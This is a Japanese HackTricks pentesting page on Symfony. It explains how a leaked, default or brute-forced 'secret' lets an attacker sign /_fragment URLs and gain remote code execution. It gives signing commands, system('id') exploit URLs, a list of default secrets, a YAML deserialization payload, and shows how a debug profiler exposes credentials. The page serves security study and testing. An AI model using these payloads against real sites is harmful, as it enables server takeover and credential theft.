# Symfony

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを共有する。

</details>

## はじめに <a href="#introduction" id="introduction"></a>

2008年の創設以来、[Symfony](https://symfony.com)フレームワークの使用はPHPベースのアプリケーションでますます増加しています。現在、[Drupal](https://www.drupal.org)、[Joomla!](https://www.joomla.org)、[eZPlatform](https://ezplatform.com)（旧eZPublish）、[Bolt](https://bolt.cm)など、多くの有名なCMSのコアコンポーネントであり、カスタムウェブサイトを構築するためによく使用されています。

Symfonyの組み込み機能の一つに、[ESI (Edge-Side Includes)](https://en.wikipedia.org/wiki/Edge\_Side\_Includes)を処理するために作られた[`FragmentListener`クラス](https://github.com/symfony/symfony/blob/5.1/src/Symfony/Component/HttpKernel/EventListener/FragmentListener.php)があります。基本的に、誰かが`/_fragment`へリクエストを発行すると、このリスナーは与えられたGETパラメーターからリクエスト属性を設定します。これにより**任意のPHPコードを実行**することが可能です（_後ほど詳しく説明します_）、リクエストはHMAC値を使用して署名されなければなりません。このHMACの秘密暗号キーは`secret`というSymfony設定値の下に保存されています。

この設定値`secret`は、例えば、CSRFトークンやリメンバーミートークンを構築するためにも使用されます。その重要性を考えると、この値は明らかに非常にランダムでなければなりません。

残念ながら、私たちはしばしば、秘密が**デフォルト値**を持っているか、その値を取得する方法、オフラインでブルートフォースする方法、またはそれに関連するセキュリティチェックを完全にバイパスする方法が存在することを発見しました。これは特にBolt、eZPlatform、eZPublishに影響を与えます。

これは単なる無害な設定の問題のように思えるかもしれませんが、デフォルト値、ブルートフォース可能な値、または推測可能な値が前述のCMSやカスタムアプリケーションで**非常に、非常に頻繁に存在する**ことがわかりました。これは主に、ドキュメントやインストールガイドでその重要性を十分に強調していないためです。

さらに、攻撃者は影響が少ない脆弱性をエスカレートして`secret`を読み取る（ファイル開示を通じて）、`/_fragment`署名プロセスをバイパスする（SSRFを使用して）、さらには`phpinfo()`を通じて漏洩させることができます！

このブログ投稿では、さまざまなCMSと基本フレームワークで秘密をどのように取得するか、および該当する秘密を使用してコード実行をどのように行うかについて説明します。

## 少しの歴史 <a href="#a-little-bit-of-history" id="a-little-bit-of-history"></a>

現代のフレームワークであるSymfonyは、その創設から現在に至るまで、リクエストのサブパーツを生成することに取り組んできました。`/_fragment`の前には`/_internal`と`/_proxy`があり、基本的に同じことを行っていました。これにより、年々多くの脆弱性が生じました：例えば[CVE-2012-6432](https://symfony.com/blog/security-release-symfony-2-0-20-and-2-1-5-released#cve-2012-6432-code-execution-vulnerability-via-the-internal-routes)、[CVE-2014-5245](https://symfony.com/blog/cve-2014-5245-direct-access-of-esi-urls-behind-a-trusted-proxy)、[CVE-2015-4050](https://symfony.com/blog/cve-2015-4050-esi-unauthorized-access)などです。

Symfony 4以降、秘密はインストール時に生成され、`/_fragment`ページはデフォルトで無効になっています。したがって、弱い`secret`を持ち、有効な`/_fragment`が存在するという組み合わせは稀だと思われるかもしれません。しかし、そうではありません：多くのフレームワークは古いSymfonyバージョン（2.xもまだ非常に存在しています）に依存しており、静的な`secret`値を実装するか、不十分に生成しています。さらに、多くはESIに依存しているため、`/_fragment`ページを有効にしています。また、私たちが見るように、他の低影響の脆弱性が、安全に生成されたとしても秘密をダンプすることを可能にすることがあります。

## `secret`を利用したコード実行 <a href="#executing-code-with-the-help-of-secret" id="executing-code-with-the-help-of-secret"></a>

まず、攻撃者が`secret`設定値を知っている場合にコード実行をどのように行うかを示します。これは最新の`symfony/http-kernel`バージョンに対して行いますが、他のバージョンに対しても同様です。

### `/_fragment`を使用して任意のコードを実行する <a href="#using-_fragment-to-run-arbitrary-code" id="using-_fragment-to-run-arbitrary-code"></a>

前述のように、`/_fragment`ページを利用します。
```php
# ./vendor/symfony/http-kernel/EventListener/FragmentListener.php

class FragmentListener implements EventSubscriberInterface
{
public function onKernelRequest(RequestEvent $event)
{
$request = $event->getRequest();

# [1]
if ($this->fragmentPath !== rawurldecode($request->getPathInfo())) {
return;
}

if ($request->attributes->has('_controller')) {
// Is a sub-request: no need to parse _path but it should still be removed from query parameters as below.
$request->query->remove('_path');

return;
}

# [2]
if ($event->isMasterRequest()) {
$this->validateRequest($request);
}

# [3]
parse_str($request->query->get('_path', ''), $attributes);
$request->attributes->add($attributes);
$request->attributes->set('_route_params', array_replace($request->attributes->get('_route_params', []), $attributes));
$request->query->remove('_path');
}
}
```
```markdown
`FragmentListener:onKernelRequest`はすべてのリクエストに対して実行されます。リクエストのパスが`/_fragment` \[1]である場合、このメソッドはまずリクエストが有効であるか（_すなわち_ 正しく署名されているか）を確認し、そうでない場合は例外を発生させます \[2]。セキュリティチェックが成功すると、URLエンコードされた`_path`パラメータを解析し、それに応じて`$request`属性を設定します。

リクエスト属性はHTTPリクエストパラメータと混同してはいけません。これらはSymfonyによって維持される内部値であり、通常はユーザーによって指定することはできません。これらのリクエスト属性の一つに`_controller`があり、どのSymfonyコントローラー（_(class, method)_のタプル、または単に_関数_）が呼び出されるべきかを指定します。`_`で始まらない名前の属性は、コントローラーに供給される引数です。例えば、このメソッドを呼び出したい場合：
```
```php
class SomeClass
{
public function someMethod($firstMethodParam, $secondMethodParam)
{
...
}
}
```
`_path`には以下のように設定します：

`_controller=SomeClass::someMethod&firstMethodParam=test1&secondMethodParam=test2`

すると、リクエストはこのようになります：

`http://symfony-site.com/_fragment?_path=_controller%3DSomeClass%253A%253AsomeMethod%26firstMethodParam%3Dtest1%26secondMethodParam%3Dtest2&_hash=...`

基本的に、これにより任意の関数や任意のクラスの任意のメソッドを、任意のパラメータで呼び出すことができます。Symfonyには多数のクラスがあるため、**コード実行は容易です**。例えば、`system()`を呼び出すことができます：

`http://localhost:8000/_fragment?_path=_controller%3Dsystem%26command%3Did%26return_value%3Dnull&_hash=...`

_`system`を呼び出すことは毎回うまくいくわけではありません：より詳細なエクスプロイトの微妙さについては、Exploitセクションを参照してください。_

一つの問題が残ります：Symfonyはリクエストの署名をどのように検証するのでしょうか？

### URLの署名 <a href="#signing-the-url" id="signing-the-url"></a>

URLの署名を検証するために、_完全な_ URLに対してHMACが計算されます。得られたハッシュは、ユーザーによって指定されたものと比較されます。

コード上では、これは二箇所で行われます：
```php
# ./vendor/symfony/http-kernel/EventListener/FragmentListener.php

class FragmentListener implements EventSubscriberInterface
{
protected function validateRequest(Request $request)
{
// is the Request safe?
if (!$request->isMethodSafe()) {
throw new AccessDeniedHttpException();
}

// is the Request signed?
if ($this->signer->checkRequest($request)) {
return;
}

# [3]
throw new AccessDeniedHttpException();
}
}

# ./vendor/symfony/http-kernel/UriSigner.php

class UriSigner
{
public function checkRequest(Request $request): bool
{
$qs = ($qs = $request->server->get('QUERY_STRING')) ? '?'.$qs : '';

// we cannot use $request->getUri() here as we want to work with the original URI (no query string reordering)
return $this->check($request->getSchemeAndHttpHost().$request->getBaseUrl().$request->getPathInfo().$qs);
}

/**
* Checks that a URI contains the correct hash.
*
* @return bool True if the URI is signed correctly, false otherwise
*/
public function check(string $uri)
{
$url = parse_url($uri);
if (isset($url['query'])) {
parse_str($url['query'], $params);
} else {
$params = [];
}

if (empty($params[$this->parameter])) {
return false;
}

$hash = $params[$this->parameter];
unset($params[$this->parameter]);

# [2]
return hash_equals($this->computeHash($this->buildUrl($url, $params)), $hash);
}

private function computeHash(string $uri): string
{
# [1]
return base64_encode(hash_hmac('sha256', $uri, $this->secret, true));
}

private function buildUrl(array $url, array $params = []): string
{
ksort($params, SORT_STRING);
$url['query'] = http_build_query($params, '', '&');

$scheme = isset($url['scheme']) ? $url['scheme'].'://' : '';
$host = isset($url['host']) ? $url['host'] : '';
$port = isset($url['port']) ? ':'.$url['port'] : '';
$user = isset($url['user']) ? $url['user'] : '';
$pass = isset($url['pass']) ? ':'.$url['pass'] : '';
$pass = ($user || $pass) ? "$pass@" : '';
$path = isset($url['path']) ? $url['path'] : '';
$query = isset($url['query']) && $url['query'] ? '?'.$url['query'] : '';
$fragment = isset($url['fragment']) ? '#'.$url['fragment'] : '';

return $scheme.$user.$pass.$host.$port.$path.$query.$fragment;
}
}
```
### 例 <a href="#example" id="example"></a>

これをテストするために、テスト環境を設定し、シークレットを抽出します（この場合、ランダムに生成されます）。
```
$ git clone https://github.com/symfony/skeleton.git
$ cd skeleton
$ composer install
$ sed -i -E 's/#(esi|fragment)/\1/g' config/packages/framework.yaml # Enable ESI/fragment
$ grep -F APP_SECRET .env # Find secret
APP_SECRET=50c8215b436ebfcc1d568effb624a40e
$ cd public
$ php -S 0:8000
```
訪問すると、`http://localhost:8000/_fragment` は `403` を返します。有効な署名を提供してみましょう：
```
$ php -r "echo(urlencode(base64_encode(hash_hmac('sha256', 'http://localhost:8000/_fragment', '50c8215b436ebfcc1d568effb624a40e', 1))) . PHP_EOL);"
lNweS5nNP8QCtMqyqrW8HIl4j9JXIfscGeRm%2FcmFOh8%3D
```
```markdown
`http://localhost:8000/_fragment?_hash=lNweS5nNP8QCtMqyqrW8HIl4j9JXIfscGeRm%2FcmFOh8%3D` をチェックすることで、`404` ステータスコードが表示されました。シグネチャは正しかったのですが、リクエスト属性を指定していなかったため、Symfonyはコントローラーを見つけることができませんでした。

任意のメソッドを任意の引数で呼び出すことができるため、例えば `system($command, $return_value)` を選択し、次のようなペイロードを提供することができます:
```
```
$ page="http://localhost:8000/_fragment?_path=_controller%3Dsystem%26command%3Did%26return_value%3Dnull"
$ php -r "echo(urlencode(base64_encode(hash_hmac('sha256', '$page', '50c8215b436ebfcc1d568effb624a40e', 1))) . PHP_EOL);"
GFhQ4Hr1LIA8mO1M%2FqSfwQaSM8xQj35vPhyrF3hvQyI%3D
```
以下は、エクスプロイトURLにアクセスすることができます：`http://localhost:8000/_fragment?_path=_controller%3Dsystem%26command%3Did%26return_value%3Dnull&_hash=GFhQ4Hr1LIA8mO1M%2FqSfwQaSM8xQj35vPhyrF3hvQyI%3D`。

`500`エラーにもかかわらず、**コマンドが実行された**ことがわかります。

_RCEを使用したフラグメント_

![1](https://www.ambionics.io/images/symfony-secret-fragment/1.png)

## シークレットの発見 <a href="#finding-secrets" id="finding-secrets"></a>

再度強調しますが、シークレットが取得できなければ、これらは重要ではありません。多くの場合、取得可能です。事前の知識なしにコード実行を得るいくつかの方法を説明します。

### 脆弱性を通じて <a href="#through-vulnerabilities" id="through-vulnerabilities"></a>

明らかなところから始めましょう：低インパクトの脆弱性を利用してシークレットを取得します。

#### ファイル読み取り <a href="#file-read" id="file-read"></a>

明らかに、ファイル読み取りの脆弱性を利用して以下のファイルを読み、`secret`を取得できます：

* `app/config/parameters.yml`
* `.env`

_例として、いくつかのSymfonyデバッグツールバーではファイルを読むことができます。_

#### PHPinfo <a href="#phpinfo" id="phpinfo"></a>

最近のSymfonyバージョン（3.x）では、`secret`は`.env`に`APP_SECRET`として保存されています。それが環境変数としてインポートされるため、`phpinfo()`ページを通じて見ることができます。

_phpinfoを通じてAPP_SECRETを漏洩_

![2](https://www.ambionics.io/images/symfony-secret-fragment/2.png)

これは、スクリーンショットで示されているように、Symfonyのプロファイラーパッケージを通じて行うことができます。

#### SSRF / IPスプーフィング (CVE-2014-5245) <a href="#ssrf-ip-spoofing-cve-2014-5245" id="ssrf-ip-spoofing-cve-2014-5245"></a>

`FragmentListener`の背後にあるコードは年々進化しています：バージョン_2.5.3_まで、リクエストが信頼できるプロキシ（つまり`localhost`）から来た場合、それは安全と見なされ、その結果ハッシュはチェックされませんでした。例えば、SSRFを使用すると、`secret`の有無に関わらず直ちにコードを実行することができます。これは特に2014.7までのeZPublishに影響します。
```php
# ./vendor/symfony/symfony/src/Symfony/Component/HttpKernel/EventListener/FragmentListener.php
# Symfony 2.3.18

class FragmentListener implements EventSubscriberInterface
{
protected function validateRequest(Request $request)
{
// is the Request safe?
if (!$request->isMethodSafe()) {
throw new AccessDeniedHttpException();
}

// does the Request come from a trusted IP?
$trustedIps = array_merge($this->getLocalIpAddresses(), $request->getTrustedProxies());
$remoteAddress = $request->server->get('REMOTE_ADDR');
if (IpUtils::checkIp($remoteAddress, $trustedIps)) {
return;
}

// is the Request signed?
// we cannot use $request->getUri() here as we want to work with the original URI (no query string reordering)
if ($this->signer->check($request->getSchemeAndHttpHost().$request->getBaseUrl().$request->getPathInfo().(null !== ($qs = $request->server->get('QUERY_STRING')) ? '?'.$qs : ''))) {
return;
}

throw new AccessDeniedHttpException();
}

protected function getLocalIpAddresses()
{
return array('127.0.0.1', 'fe80::1', '::1');
}
```
これらのテクニックは別の脆弱性が必要です。さらに良いベクトルについて詳しく見ていきましょう：デフォルト値。

### デフォルト値を通じて <a href="#through-default-values" id="through-default-values"></a>

#### Symfony <= 3.4.43: `ThisTokenIsNotSoSecretChangeIt` <a href="#symfony-3443-thistokenisnotsosecretchangeit" id="symfony-3443-thistokenisnotsosecretchangeit"></a>

Symfonyのウェブサイトを設定する際、最初のステップは[symfony-standard](https://github.com/symfony/symfony-standard)スケルトンをインストールすることです。インストール時に、いくつかの設定値を求めるプロンプトが表示されます。デフォルトでは、キーは`ThisTokenIsNotSoSecretChangeIt`です。

_Symfonyのcomposerを通じたインストール_

![3](https://www.ambionics.io/images/symfony-secret-fragment/3.png)

バージョン4以降では、シークレットキーは安全に生成されます。

#### ezPlatform 3.x (最新): `ff6dc61a329dc96652bb092ec58981f7` <a href="#ezplatform-3x-latest-ff6dc61a329dc96652bb092ec58981f7" id="ezplatform-3x-latest-ff6dc61a329dc96652bb092ec58981f7"></a>

[ezPlatform](https://ezplatform.com)は、[ezPublish](https://en.wikipedia.org/wiki/EZ\_Publish)の後継であり、依然としてSymfonyを使用しています。2019年6月10日に、デフォルトキーを`ff6dc61a329dc96652bb092ec58981f7`に設定する[コミット](https://github.com/ezsystems/ezplatform/commit/974f2a70d9d0507ba7ca17226693b1a4967f23cf#diff-f579cccc964135c7d644c7b2d3b0d3ecR59)がありました。脆弱なバージョンは3.0-alpha1から3.1.1（現在）までです。

[ドキュメント](https://doc.ezplatform.com/en/latest/getting\_started/install\_ez\_platform/#change-installation-parameters)にはシークレットを変更すべきだと記載されていますが、強制されていません。

#### ezPlatform 2.x: `ThisEzPlatformTokenIsNotSoSecret_PleaseChangeIt` <a href="#ezplatform-2x-thisezplatformtokenisnotsosecret_pleasechangeit" id="ezplatform-2x-thisezplatformtokenisnotsosecret_pleasechangeit"></a>

Symfonyのスケルトンと同様に、インストール中にシークレットを入力するよう求められます。デフォルト値は`ThisEzPlatformTokenIsNotSoSecret_PleaseChangeIt`です。

#### Bolt CMS <= 3.7 (最新): `md5(__DIR__)` <a href="#bolt-cms-37-latest-md5__dir__" id="bolt-cms-37-latest-md5__dir__"></a>

[Bolt CMS](https://bolt.cm)は、Symfonyに基づいた非推奨のマイクロフレームワークである[Silex](https://github.com/silexphp/Silex)を使用しています。シークレットキーはこの計算を使用して設定されます：
```php
# ./vendor/silex/silex/src/Silex/Provider/HttpFragmentServiceProvider.php
$app['uri_signer.secret'] = md5(__DIR__);

# ./vendor/silex/silex/src/Silex/Provider/FormServiceProvider.php
$app['form.secret'] = md5(__DIR__);
```
そのため、秘密を推測するか、Full Path Disclosureの脆弱性を利用して計算することができます。

デフォルトの秘密鍵で成功しなかった場合でも、絶望する必要はありません。他の方法があります。

### ブルートフォース <a href="#bruteforce" id="bruteforce"></a>

秘密はしばしば手動で設定されるため（ランダムに生成されるのではない）、人々は安全なランダム値の代わりにパスフレーズを使用することが多く、ハッシュがあればブルートフォースが可能です。明らかに、Symfonyによって生成された有効な `/_fragment` URLは、秘密をブルートフォースするための有効なメッセージ-ハッシュの組み合わせを提供します。

_フラグメントへの有効なリクエストがレスポンスに含まれています_

![4](https://www.ambionics.io/images/symfony-secret-fragment/4.png)

このブログ投稿の初めに、Symfonyの秘密にはいくつかの用途があると述べました。その用途の一つは、CSRFトークンを生成することです。`secret`の別の用途は、リメンバーミークッキーに署名することです。場合によっては、攻撃者は自分のCSRFトークンやリメンバーミークッキーを使用して、`secret`の値をブルートフォースすることができます。

_これらのトークンの構築のリバースエンジニアリングは、読者にとっての演習として残されています。_

### さらに進む: eZPublish <a href="#going-further-ezpublish" id="going-further-ezpublish"></a>

秘密をブルートフォースしてコード実行を達成する例として、eZPublish 2014.07の秘密をどのように見つけるかを見てみましょう。

#### ブルートフォース素材の探索 <a href="#finding-bruteforce-material" id="finding-bruteforce-material"></a>

eZPublishは次のようにCSRFトークンを生成します：
```php
# ./ezpublish_legacy/extension/ezformtoken/event/ezxformtoken.php
self::$token = sha1( self::getSecret() . self::getIntention() . session_id() );
```
このトークンを構築するために、eZPは私たちが知っている2つの値とシークレットを使用します：`getIntention()`はユーザーが試みているアクションです（例えば`authenticate`）、`session_id()`はPHPのセッションIDです、そして`getSecret()`は、まあ、Symfonyの`secret`です。

CSRFトークンはいくつかのフォームで見つけることができるため、シークレットをブルートフォースするための材料が今あります。

残念ながら、ezPublishはsensiolabsからバンドルを組み込みました、[sensio/distribution-bundle](https://packagist.org/packages/sensio/distribution-bundle)。このパッケージはシークレットキーがランダムであることを確実にします。インストール時にこのように生成します：
```php
# ./vendor/sensio/distribution-bundle/Sensio/Bundle/DistributionBundle/Configurator/Step/SecretStep.php

private function generateRandomSecret()
{
return hash('sha1', uniqid(mt_rand()));
}
```
これはブルートフォース攻撃には非常に困難です：`mt_rand()`は2^31個の異なる値を生成可能で、`uniqid()`は現在のタイムスタンプ（マイクロ秒単位）から構築されます。
```php
// Simplified uniqid code

struct timeval tv;
gettimeofday(&tv, NULL);
return strpprintf(0, "%s%08x%05x", prefix, tv.tv_sec, tv.tv_usec);
```
#### タイムスタンプの開示 <a href="#disclosing-the-timestamp" id="disclosing-the-timestamp"></a>

幸いにも、この秘密はインストールの最後のステップで生成されることを知っています。ウェブサイトが設定された直後です。これは、このハッシュを生成するために使用されたタイムスタンプを漏洩させることができるかもしれません。

一つの方法は、ログ（例：`/var/log/storage.log`）を使用することです。キャッシュエントリが最初に作成された時間を漏洩させることができます。キャッシュエントリは `generateRandomSecret()` が呼び出された直後に作成されます。

_サンプルログ内容：タイムスタンプは秘密を計算するために使用されるものと似ています_

![5](https://www.ambionics.io/images/symfony-secret-fragment/5.png)

ログが利用できない場合、eZPublishの非常に強力な検索エンジンを使用して、ウェブサイトの最初の要素の作成時間を見つけることができます。実際、サイトが作成されると、多くのタイムスタンプがデータベースに入れられます。これは、eZPublishウェブサイトの初期データのタイムスタンプが `uniqid()` を計算するために使用されるものと同じであることを意味します。`landing_page` _ContentObject_ を探して、そのタイムスタンプを見つけ出すことができます。

## 不足しているビットのブルートフォース <a href="#bruteforcing-the-missing-bits" id="bruteforcing-the-missing-bits"></a>

私たちは、秘密を計算するために使用されたタイムスタンプと、次の形式のハッシュを知っています：
```php
$random_value = mt_rand();
$timestamp_hex = sprintf("%08x%05x", $known_timestamp, $microseconds);
$known_plaintext = '<intention><sessionID>';
$known_hash = sha1(sha1(mt_rand() . $timestamp_hex) . $known_plaintext);
```
これにより、合計で231 \* 106の可能性が残ります。[hashcat](https://hashcat.net)と良いGPUセットを使用すれば実行可能に感じますが、hashcatは`sha1(sha1($pass).$salt)`カーネルを提供していません。幸いなことに、私たちはそれを実装しました！[プルリクエストはこちら](https://github.com/hashcat/hashcat/pull/2536)で見つけることができます。

私たちのクラッキングマシンを使用すると、8つのGPUを搭載しており、このハッシュを_20時間未満_でクラックできます。

ハッシュを取得した後、`/_fragment`を使用してコードを実行できます。

## 結論 <a href="#conclusion" id="conclusion"></a>

Symfonyは現在、多くのPHPアプリケーションのコアコンポーネントです。そのため、フレームワークに影響を与えるセキュリティリスクは多くのウェブサイトに影響を与えます。この記事で示されているように、弱いシークレットまたは影響が少ない脆弱性が攻撃者に**リモートコード実行**を可能にします。

ブルーチームのメンバーとして、Symfonyに依存するすべてのウェブサイトを確認する必要があります。ソフトウェアを最新の状態に保つことは脆弱性を排除することはできません。なぜなら、シークレットキーは製品の最初のインストール時に生成されるからです。したがって、数年前にSymfony-3.xベースのウェブサイトを作成し、途中で最新の状態に保っていた場合、シークレットキーはまだデフォルトのものである可能性があります。

## 悪用 <a href="#exploitation" id="exploitation"></a>

### 理論 <a href="#theory" id="theory"></a>

一方で、この脆弱性を悪用する際に心配するべきいくつかの点があります：

* HMACは**完全なURL**を使用して計算されます。ウェブサイトがリバースプロキシの後ろにある場合、ペイロードを送信するURLではなく、サービスの内部URLを使用する必要があります。例えば、内部URLはHTTPSではなくHTTPである可能性があります。
* HMACのアルゴリズムは年々変わっています：以前は**SHA-1**で、現在は**SHA-256**です。
* Symfonyはリクエストから`_hash`パラメータを削除し、その後URLを再生成するため、Symfonyが行うのと同じURLでハッシュを計算する必要があります。
* 多くのシークレットが使用される可能性があるため、すべてをチェックする必要があります。
* 一部のPHPバージョンでは、`system($command, &$return_value)`のような"参照渡し"パラメータを持つ関数を呼び出すことができません。
* 一部のSymfonyバージョンでは、`_controller`は関数ではなくメソッドでなければなりません。コードを実行できるSymfonyメソッドを見つける必要があります。

他方で、いくつかの利点を利用できます：

* パラメータなしで`/_fragment`にアクセスするか、無効なハッシュでアクセスすると`403`が返されます。
* 有効なハッシュを持つが有効なコントローラーがない`/_fragment`にアクセスすると`500`が返されます。

最後の点により、その後どの関数やメソッドを呼び出すかを心配することなく、シークレット値をテストできます。

### 実践 <a href="#practice" id="practice"></a>

`https://target.com/_fragment`を攻撃しているとしましょう。正しくURLに署名するためには、以下の情報が必要です：

* 内部URL：`https://target.com/_fragment`、または`http://target.com/_fragment`、あるいは全く異なるもの（例：`http://target.website.internal`）である可能性がありますが、これは推測できません
* シークレットキー：`ThisTokenIsNotSoSecretChangeIt`、`ThisEzPlatformTokenIsNotSoSecret_PleaseChangeIt`など、通常のシークレットキーのリストがあります。
* アルゴリズム：SHA1またはSHA256

まだ実際のペイロード（`_path`の内容）について心配する必要はありません。なぜなら、適切に署名されたURLは`AccessDeniedHttpException`がスローされず、したがって`403`を結果として返さないからです。したがって、エクスプロイトは各`(アルゴリズム, URL, シークレット)`の組み合わせを試し、URLを生成し、`403`ステータスコードを返さないかどうかをチェックします。

_パラメータ`_path`なしでの`/_fragment`への有効なリクエスト_

![6](https://www.ambionics.io/images/symfony-secret-fragment/6.png)

この時点で、任意の`/_fragment` URLに署名できるため、保証されたRCEです。問題は何を呼び出すかです。

次に、関数を直接呼び出すことができるか、クラスメソッドを使用する必要があるかを見つける必要があります。まずは最も簡単な方法を試してみることができます。`phpinfo ([ int $what = INFO_ALL ] )`（[ドキュメント](https://www.php.net/manual/en/function.phpinfo.php)）のような関数を使用します。GETパラメータ`_path`は次のようになります：
```
_controller=phpinfo
&what=-1
```
URLは次のようになります：

`http://target.com/_fragment?_path=_controller%3Dphpinfo%26what%3D-1&_hash=...`

HTTPレスポンスに`phpinfo()`ページが表示されたら、勝ちです。次に、`assert`のような別の関数を試してみることができます：

_`_controller=assert`を使用したサンプル出力_

![7](https://www.ambionics.io/images/symfony-secret-fragment/7.png)

そうでなければ、クラスメソッドを使用する必要があることを意味します。これには`Symfony\Component\Yaml\Inline::parse`が良い候補です。これは組み込みのSymfonyクラスであり、Symfonyウェブサイトに存在します。

明らかに、このメソッドはYAML入力文字列を解析します。Symfonyの[YAML](https://yaml.org)パーサーは`php/object`タグをサポートしており、`unserialize()`を使用してシリアライズされた入力文字列をオブジェクトに変換します。これにより、私たちのお気に入りのPHPツール、[PHPGGC](https://github.com/ambionics/phpggc)を使用できます！

メソッドのプロトタイプは年々変わっています。例えば、ここに3つの異なるプロトタイプがあります：
```
public static function parse($value, $flags, $references);
public static function parse($value, $exceptionOnInvalidType, $objectSupport);
public static function parse($value, $exceptionOnInvalidType, $objectSupport, $objectForMap, $references);
```
```markdown
これらのそれぞれに対して `_path` を構築する代わりに、メソッドのプロトタイプと一致しない名前の引数を渡すと、それが無視されるという事実を利用することができます。したがって、実際のプロトタイプについて心配することなく、メソッドに可能な限りの引数を追加することができます。

そのため、 `_path` を次のように構築できます：
```
```
_controller=Symfony\Component\Yaml\Inline::parse
&value=!php/object O:32:"Monolog\Handler\SyslogUdpHandler":...
&flags=516
&exceptionOnInvalidType=0
&objectSupport=1
&objectForMap=0
&references=
&flags=516
```
```markdown
`phpinfo()`を試してみて、うまくいけば`system()`を使用できます。

_シリアライズされたペイロードを使用した`Inline::parse`のサンプル出力_

![8](https://www.ambionics.io/images/symfony-secret-fragment/8.png)

したがって、エクスプロイトはすべての可能な変数の組み合わせを実行し、その後2つのエクスプロイト方法を試みます。コードは[私たちのGitHub](https://github.com/ambionics/symfony-exploits)で利用可能です。

## symfony /\_profiler情報へのアクセス

![f:id:flattsecurity:20201021204553p:plain](https://cdn-ak.f.st-hatena.com/images/fotolife/f/flattsecurity/20201021/20201021204553.png)

上のスクリーンショットで見るように、ページの右下に`sf`ロゴがあります。このロゴはSymfonyがデバッグモードの下にあるときに表示されます。このロゴが表示されない場合もあるので、`/_profiler`にアクセスしてみてください。以下に示すようなページが表示されます。

![f:id:flattsecurity:20201021204605p:plain](https://cdn-ak.f.st-hatena.com/images/fotolife/f/flattsecurity/20201021/20201021204605.png)

この機能はSymfony Profilerと呼ばれ、インターネット上でこの機能に関する情報はあまりありません。この機能の意図は明確です。エラーやバグがあるときにデバッグを助けるためです。もちろん、この機能はデバッグモードが有効なときにのみ使用できます。

Symfonyフレームワーク自体は非常に安全ですが、デバッグモードを有効にすると、このフレームワークは非常に脆弱になります。例えば、Profilerには以下のスクリーンショットのようなProfile Searchという機能があります。

![f:id:flattsecurity:20201021204624p:plain](https://cdn-ak.f.st-hatena.com/images/fotolife/f/flattsecurity/20201021/20201021204624.png)

上のスクリーンショットで見るように、サーバーに送信されたすべてのリクエストにアクセスできます。トークンのハッシュをクリックすると、以下のスクリーンショットに示すように、すべてのPOSTパラメータを読むことができます。この機能を使って、管理者とユーザーのアカウント資格情報をハイジャックすることができます。

![f:id:flattsecurity:20201021204637p:plain](https://cdn-ak.f.st-hatena.com/images/fotolife/f/flattsecurity/20201021/20201021204637.png)

### デバッグが有効な他のエンドポイント

これらのURLもチェックするべきです：

* **https://example.com/app\_dev.php/\_profiler**
* **https://example.com/app\_dev.php**\\

## 参考文献

* [**https://www.ambionics.io/blog/symfony-secret-fragment**](https://www.ambionics.io/blog/symfony-secret-fragment)
* [**https://flattsecurity.hatenablog.com/entry/2020/11/02/124807**](https://flattsecurity.hatenablog.com/entry/2020/11/02/124807)
* [**https://infosecwriteups.com/how-i-was-able-to-find-multiple-vulnerabilities-of-a-symfony-web-framework-web-application-2b82cd5de144**](https://infosecwriteups.com/how-i-was-able-to-find-multiple-vulnerabilities-of-a-symfony-web-framework-web-application-2b82cd5de144)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)でAWSハッキングをゼロからヒーローまで学ぶ</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksに広告を掲載したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**、または**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを共有する。

</details>
```
